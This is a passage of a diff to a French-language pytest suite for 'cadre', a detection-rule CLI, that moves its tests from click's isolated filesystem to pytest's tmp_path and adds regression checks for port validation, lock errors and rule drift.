             lambda self, rid, yaml, pipeline="ecs_windows", forcer=False: {
@@ -758,14 +764,14 @@ class TestCommandeRegle:
                 "raison": "FAUX_NEGATIF",
             },
         )
-        with runner.isolated_filesystem():
-            Path("rules_generees").mkdir()
-            Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
-            resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
+        monkeypatch.chdir(tmp_path)
+        Path("rules_generees").mkdir()
+        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
+        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001"])
         assert resultat.exit_code != 0
         assert "Non déployée" in resultat.output
 
-    def test_pousser_forcer_transmis(self, runner, monkeypatch):
+    def test_pousser_forcer_transmis(self, runner, monkeypatch, tmp_path):
         forcer_recus = []
 
         def redeployer_qui_capture(self, rid, yaml, pipeline="ecs_windows", forcer=False):
@@ -783,10 +789,10 @@ class TestCommandeRegle:
             "cadre.orchestrateur.OrchestrateurCADRE.redeployer_regle_editee",
             redeployer_qui_capture,
         )
-        with runner.isolated_filesystem():
-            Path("rules_generees").mkdir()
-            Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
-            resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001", "--forcer"])
+        monkeypatch.chdir(tmp_path)
+        Path("rules_generees").mkdir()
+        Path("rules_generees/CADRE-DIS-001.yml").write_text("title: x", encoding="utf-8")
+        resultat = runner.invoke(cli, ["regle", "pousser", "cadre-dis-001", "--forcer"])
         assert resultat.exit_code == 0
         assert forcer_recus == [True]
         assert "forcée" in resultat.output
@@ -796,22 +802,22 @@ class TestCommandeRechercher:
     """`cadre rechercher` -- recherche par mot-clé (catalogue + Atomic Red
     Team), avec repli optionnel sur la découverte IA (toujours en revue)."""
 
-    def test_trouve_dans_le_catalogue(self, runner):
+    def test_trouve_dans_le_catalogue(self, runner, tmp_path, monkeypatch):
         attaque_id = CATALOGUE[0].id
         mot = CATALOGUE[0].technique_mitre
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["rechercher", mot, "--sans-atomic"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["rechercher", mot, "--sans-atomic"])
         assert resultat.exit_code == 0
         assert attaque_id in resultat.output
 
-    def test_rien_trouve_sans_decouvrir_suggere_la_commande(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
+    def test_rien_trouve_sans_decouvrir_suggere_la_commande(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
         assert resultat.exit_code == 0
         assert "Rien trouvé" in resultat.output
         assert "cadre decouvrir" in resultat.output
 
-    def test_rien_trouve_avec_decouvrir_appelle_lia_en_revue(self, runner, monkeypatch):
+    def test_rien_trouve_avec_decouvrir_appelle_lia_en_revue(self, runner, monkeypatch, tmp_path):
         captures = []
 
         def decouvrir_qui_capture(orchestrateur, descriptions, techniques=None, revue=False):
@@ -819,23 +825,23 @@ class TestCommandeRechercher:
             return {"decouvertes": [], "refusees": [], "echecs": []}
 
         monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", decouvrir_qui_capture)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
+        )
         assert resultat.exit_code == 0
         assert captures == [{"descriptions": ["xyzzy-introuvable"], "revue": True}]
 
-    def test_sans_decouvrir_ne_declenche_jamais_lia(self, runner, monkeypatch):
+    def test_sans_decouvrir_ne_declenche_jamais_lia(self, runner, monkeypatch, tmp_path):
         def decouvrir_qui_leve(*a, **k):
             raise AssertionError("ne doit pas être appelé sans --decouvrir")
 
         monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", decouvrir_qui_leve)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic"])
         assert resultat.exit_code == 0
 
-    def test_decouvrir_verrou_actif_message_clair(self, runner, monkeypatch):
+    def test_decouvrir_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
         """Régression (audit) : VerrouCycleActifError levée par
         decouvrir_attaques() (repli --decouvrir) n'était pas rattrapée --
         traceback Python brute au lieu d'un message clair."""
@@ -845,17 +851,17 @@ class TestCommandeRechercher:
             raise VerrouCycleActifError("cycle déjà en cours (verrou tenu par PID 4242)")
 
         monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", leve_verrou)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli, ["rechercher", "xyzzy-introuvable", "--sans-atomic", "--decouvrir"]
+        )
         assert resultat.exit_code != 0
         assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
         assert "déjà en cours" in resultat.output
 
 
 class TestCommandeDecouvrir:
-    def test_verrou_actif_message_clair(self, runner, monkeypatch):
+    def test_verrou_actif_message_clair(self, runner, monkeypatch, tmp_path):
         """Régression (audit) : VerrouCycleActifError levée par
         decouvrir_attaques() (import différé dans decouvrir()) n'était pas
         rattrapée -- traceback Python brute au lieu d'un message clair."""
@@ -865,8 +871,8 @@ class TestCommandeDecouvrir:
             raise VerrouCycleActifError("cycle déjà en cours (verrou tenu par PID 4242)")
 
         monkeypatch.setattr("cadre.decouverte_ia.decouvrir_attaques", leve_verrou)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["decouvrir", "-d", "test"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["decouvrir", "-d", "test"])
         assert resultat.exit_code != 0
         assert resultat.exception is None or isinstance(resultat.exception, SystemExit)
         assert "déjà en cours" in resultat.output
@@ -924,36 +930,34 @@ class TestCommandeSuggest:
 
 
 class TestCommandeStatus:
-    def test_services_ok(self, runner, monkeypatch):
+    def test_services_ok(self, runner, monkeypatch, tmp_path):
         class ReponseFactice:
             status_code = 200
 
         monkeypatch.setattr("requests.get", lambda *a, **k: ReponseFactice())
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["status"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["status"])
         assert resultat.exit_code == 0
         assert "Elasticsearch" in resultat.output
         assert "OK" in resultat.output
 
-    def test_services_injoignables(self, runner, monkeypatch):
+    def test_services_injoignables(self, runner, monkeypatch, tmp_path):
         def get_qui_echoue(*args, **kwargs):
             raise ConnectionError("connexion refusée")
 
         monkeypatch.setattr("requests.get", get_qui_echoue)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["status"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["status"])
         assert resultat.exit_code == 0
         assert "connexion refusée" in resultat.output
 
 
 class TestCommandeRapport:
-    def test_soutenance(self, runner):
-        with runner.isolated_filesystem() as tmp_dir:
-            from pathlib import Path
-
-            resultat = runner.invoke(cli, ["rapport", "--soutenance"])
-            assert resultat.exit_code == 0
-            assert (Path(tmp_dir) / "RAPPORT_PFA_CADRE.md").exists()
+    def test_soutenance(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["rapport", "--soutenance"])
+        assert resultat.exit_code == 0
+        assert (tmp_path / "RAPPORT_PFA_CADRE.md").exists()
 
     def test_sans_option(self, runner):
         """Régression (audit) « rapport mort » : cette branche affichait
@@ -1070,7 +1074,7 @@ class TestCommandeDaemon:
 
 
 class TestCommandeMetrics:
-    def test_demarrage_et_arret_propre(self, runner, monkeypatch):
+    def test_demarrage_et_arret_propre(self, runner, monkeypatch, tmp_path):
         class ServeurFactice:
             def __init__(self, adresse, handler):
                 self.adresse = adresse
@@ -1083,13 +1087,13 @@ class TestCommandeMetrics:
                 pass
 
         monkeypatch.setattr("http.server.ThreadingHTTPServer", ServeurFactice)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
         assert resultat.exit_code == 0
         assert "9999" in resultat.output
         assert "Arrêt du serveur" in resultat.output
 
-    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch):
+    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch, tmp_path):
         """Régression (audit) : `--port` n'était jamais validé -- un port
         hors plage (0-65535) passait le typage entier de click puis
         plantait dans ThreadingHTTPServer() avec un OverflowError/OSError
@@ -1101,8 +1105,8 @@ class TestCommandeMetrics:
         monkeypatch.setattr(
             "http.server.ThreadingHTTPServer", serveur_qui_ne_doit_jamais_etre_appele
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["metrics", "--port", "99999"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["metrics", "--port", "99999"])
         assert resultat.exit_code != 0
         assert not isinstance(resultat.exception, AssertionError)
         assert "invalide" in resultat.output.lower()
@@ -1127,7 +1131,9 @@ class TestCommandeMetrics:
         assert "cadre_cycles_total 4\n" in second
         assert "cadre_validees_total 3\n" in second
 
-    def test_do_get_relit_a_chaque_requete_pas_seulement_au_demarrage(self, runner, monkeypatch):
+    def test_do_get_relit_a_chaque_requete_pas_seulement_au_demarrage(
+        self, runner, monkeypatch, tmp_path
+    ):
         """Régression (audit) : `stats` était lu UNE SEULE FOIS à l'appel de
         `cadre metrics` (avant l'instanciation du handler HTTP), puis capturé
         par fermeture (closure) et réutilisé tel quel pour CHAQUE requête
@@ -1167,8 +1173,8 @@ class TestCommandeMetrics:
 
         monkeypatch.setattr("cadre.cli._texte_metriques_prometheus", _texte_factice)
 
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["metrics", "--port", "9999"])
         assert resultat.exit_code == 0
 
         gestionnaire = handler_capture["classe"]
@@ -1190,13 +1196,13 @@ class TestCommandeMetrics:
 class TestCommandeMetriques:
     """`cadre metriques` -- non testée directement au niveau CLI avant ce lot."""
 
-    def test_aucun_cycle_trouve(self, runner):
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["metriques"])
+    def test_aucun_cycle_trouve(self, runner, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["metriques"])
         assert resultat.exit_code == 0
         assert "Aucun cycle trouvé" in resultat.output
 
-    def test_affiche_les_indicateurs(self, runner, monkeypatch):
+    def test_affiche_les_indicateurs(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.metriques.metriques_dernier_cycle",
             lambda repertoire: {
@@ -1212,33 +1218,33 @@ class TestCommandeMetriques:
                 "hypothese_heures_par_regle": 1.6,
             },
         )
-        with runner.isolated_filesystem():
-            Path("rapports").mkdir(parents=True, exist_ok=True)
-            Path("rapports/cycle_20260101_000000.csv").write_text("timestamp\n", encoding="utf-8")
-            resultat = runner.invoke(cli, ["metriques"])
+        monkeypatch.chdir(tmp_path)
+        Path("rapports").mkdir(parents=True, exist_ok=True)
+        Path("rapports/cycle_20260101_000000.csv").write_text("timestamp\n", encoding="utf-8")
+        resultat = runner.invoke(cli, ["metriques"])
         assert resultat.exit_code == 0
         assert "5" in resultat.output
         assert "8.0" in resultat.output
 
-    def test_cumul_sans_fichier_cumulatif(self, runner):
+    def test_cumul_sans_fichier_cumulatif(self, runner, tmp_path, monkeypatch):
         """--cumul nécessite cadre_cumulatif.json (alimenté par `cadre loop`,
         pas `cadre cycle`) -- message clair plutôt qu'une erreur si absent."""
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["metriques", "--cumul"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["metriques", "--cumul"])
         assert resultat.exit_code == 0
         assert "Aucun cumulatif trouvé" in resultat.output
 
-    def test_cumul_affiche_le_temps_gagne_cumule(self, runner):
+    def test_cumul_affiche_le_temps_gagne_cumule(self, runner, tmp_path, monkeypatch):
         """Régression : calculer_tendance_cumulative() était testée
         unitairement mais jamais appelée par aucun code de production --
         cette métrique n'était exposée nulle part."""
-        with runner.isolated_filesystem():
-            Path("rapports").mkdir(parents=True, exist_ok=True)
-            Path("rapports/cadre_cumulatif.json").write_text(
-                '{"total_cycles": 3, "total_attaques": 12, "validees": 10}',
-                encoding="utf-8",
-            )
-            resultat = runner.invoke(cli, ["metriques", "--cumul"])
+        monkeypatch.chdir(tmp_path)
+        Path("rapports").mkdir(parents=True, exist_ok=True)
+        Path("rapports/cadre_cumulatif.json").write_text(
+            '{"total_cycles": 3, "total_attaques": 12, "validees": 10}',
+            encoding="utf-8",
+        )
+        resultat = runner.invoke(cli, ["metriques", "--cumul"])
         assert resultat.exit_code == 0
         assert "3" in resultat.output  # total_cycles
         assert "16.0" in resultat.output  # 10 * 1.6h/règle (HEURES_PAR_REGLE_MANUELLE)
@@ -1335,17 +1341,17 @@ class TestCommandeDerive:
     """`cadre derive` -- détection de dérive d'une règle déjà validée, non
     testée directement au niveau CLI avant ce lot (seulement en réel à la main)."""
 
-    def test_historique_insuffisant(self, runner, monkeypatch):
+    def test_historique_insuffisant(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.metriques.detecter_derive_regle",
             lambda attaque_id, repertoire: {"statut": "INSUFFISANT", "nb_mesures": 0},
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
         assert resultat.exit_code == 0
         assert "Pas assez d'historique" in resultat.output
 
-    def test_stable(self, runner, monkeypatch):
+    def test_stable(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.metriques.detecter_derive_regle",
             lambda attaque_id, repertoire: {
@@ -1355,12 +1361,12 @@ class TestCommandeDerive:
                 "derniere": {"timestamp": "t2", "nb_tp": 1, "nb_fp": 6},
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
         assert resultat.exit_code == 0
         assert "Stable" in resultat.output
 
-    def test_perte_detection(self, runner, monkeypatch):
+    def test_perte_detection(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.metriques.detecter_derive_regle",
             lambda attaque_id, repertoire: {
@@ -1370,12 +1376,12 @@ class TestCommandeDerive:
                 "derniere": {"timestamp": "t2", "nb_tp": 0, "nb_fp": 0},
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
         assert resultat.exit_code == 0
         assert "Perte de détection" in resultat.output
 
-    def test_derive_bruit(self, runner, monkeypatch):
+    def test_derive_bruit(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr(
             "cadre.metriques.detecter_derive_regle",
             lambda attaque_id, repertoire: {
@@ -1385,8 +1391,8 @@ class TestCommandeDerive:
                 "derniere": {"timestamp": "t2", "nb_tp": 1, "nb_fp": 20},
             },
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["derive", "CADRE-TEST-001"])
         assert resultat.exit_code == 0
         assert "Dérive de bruit" in resultat.output
 
@@ -1395,58 +1401,58 @@ class TestCommandeRaffiner:
     """`cadre raffiner` -- ajuste les paramètres de détection d'une attaque
     EXISTANTE sans en créer une nouvelle."""
 
-    def test_attaque_introuvable(self, runner, monkeypatch):
+    def test_attaque_introuvable(self, runner, monkeypatch, tmp_path):
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: None)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", "CADRE-FAKE-999", "--seuil-fp", "10"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", "CADRE-FAKE-999", "--seuil-fp", "10"])
         assert resultat.exit_code != 0
         assert "introuvable" in resultat.output
 
-    def test_aucune_option_ne_fait_rien(self, runner, monkeypatch, exemple_attaque):
+    def test_aucune_option_ne_fait_rien(self, runner, monkeypatch, exemple_attaque, tmp_path):
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id])
         assert resultat.exit_code == 0
         assert "Rien à raffiner" in resultat.output
 
-    def test_enregistrement_reussi(self, runner, monkeypatch, exemple_attaque):
+    def test_enregistrement_reussi(self, runner, monkeypatch, exemple_attaque, tmp_path):
         appels = []
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
         monkeypatch.setattr(
             "cadre.raffinement.enregistrer_raffinement",
             lambda attaque_id, champs: appels.append((attaque_id, champs)),
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "15"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "15"])
         assert resultat.exit_code == 0
         assert appels == [(exemple_attaque.id, {"seuil_fp_max": 15})]
         assert "enregistré" in resultat.output
 
-    def test_deux_options_combinees(self, runner, monkeypatch, exemple_attaque):
+    def test_deux_options_combinees(self, runner, monkeypatch, exemple_attaque, tmp_path):
         appels = []
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
         monkeypatch.setattr(
             "cadre.raffinement.enregistrer_raffinement",
             lambda attaque_id, champs: appels.append((attaque_id, champs)),
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(
-                cli,
-                [
-                    "raffiner",
-                    exemple_attaque.id,
-                    "--valeur-detection",
-                    "NOUVEAU_MARQUEUR",
-                    "--seuil-fp",
-                    "15",
-                ],
-            )
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(
+            cli,
+            [
+                "raffiner",
+                exemple_attaque.id,
+                "--valeur-detection",
+                "NOUVEAU_MARQUEUR",
+                "--seuil-fp",
+                "15",
+            ],
+        )
         assert resultat.exit_code == 0
         assert appels == [
             (exemple_attaque.id, {"valeur_detection": "NOUVEAU_MARQUEUR", "seuil_fp_max": 15})
         ]
 
-    def test_refus_remonte_a_l_utilisateur(self, runner, monkeypatch, exemple_attaque):
+    def test_refus_remonte_a_l_utilisateur(self, runner, monkeypatch, exemple_attaque, tmp_path):
         from cadre.raffinement import ErreurRaffinement
 
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
@@ -1455,43 +1461,45 @@ class TestCommandeRaffiner:
             raise ErreurRaffinement("seuil_fp_max doit être un entier strictement positif")
 
         monkeypatch.setattr("cadre.raffinement.enregistrer_raffinement", refuse)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "-5"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--seuil-fp", "-5"])
         assert resultat.exit_code != 0
         assert "refusé" in resultat.output
 
-    def test_reinitialiser_existant(self, runner, monkeypatch, exemple_attaque):
+    def test_reinitialiser_existant(self, runner, monkeypatch, exemple_attaque, tmp_path):
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
         monkeypatch.setattr("cadre.raffinement.supprimer_raffinement", lambda id_: True)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
         assert resultat.exit_code == 0
         assert "retiré" in resultat.output
 
-    def test_reinitialiser_sans_raffinement_actif(self, runner, monkeypatch, exemple_attaque):
+    def test_reinitialiser_sans_raffinement_actif(
+        self, runner, monkeypatch, exemple_attaque, tmp_path
+    ):
         monkeypatch.setattr("cadre.catalogue_attaques.obtenir_attaque", lambda id_: exemple_attaque)
         monkeypatch.setattr("cadre.raffinement.supprimer_raffinement", lambda id_: False)
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["raffiner", exemple_attaque.id, "--reinitialiser"])
         assert resultat.exit_code == 0
         assert "Aucun raffinement actif" in resultat.output
 
 
 class TestCommandeDashboard:
-    def test_demarrage_appelle_lancer_dashboard(self, runner, monkeypatch):
+    def test_demarrage_appelle_lancer_dashboard(self, runner, monkeypatch, tmp_path):
         appels = []
         monkeypatch.setattr(
             "cadre.dashboard.lancer_dashboard",
             lambda **kwargs: appels.append(kwargs),
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["dashboard", "--port", "8888"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["dashboard", "--port", "8888"])
         assert resultat.exit_code == 0
         assert "8888" in resultat.output
         assert appels[0]["port"] == 8888
         assert appels[0]["bind"] == "127.0.0.1"
 
-    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch):
+    def test_port_hors_plage_refuse_proprement(self, runner, monkeypatch, tmp_path):
         """Régression (audit) : même défaut que `cadre metrics --port` avant
         sa correction -- `--port` n'était jamais validé ici, un port hors
         plage (0-65535) passait le typage entier de click puis plantait
@@ -1506,8 +1514,8 @@ class TestCommandeDashboard:
         monkeypatch.setattr(
             "cadre.dashboard.lancer_dashboard", lancer_dashboard_qui_ne_doit_jamais_etre_appele
         )
-        with runner.isolated_filesystem():
-            resultat = runner.invoke(cli, ["dashboard", "--port", "99999"])
+        monkeypatch.chdir(tmp_path)
+        resultat = runner.invoke(cli, ["dashboard", "--port", "99999"])
         assert resultat.exit_code != 0
         assert not isinstance(resultat.exception, AssertionError)
         assert "invalide" in resultat.output.lower()
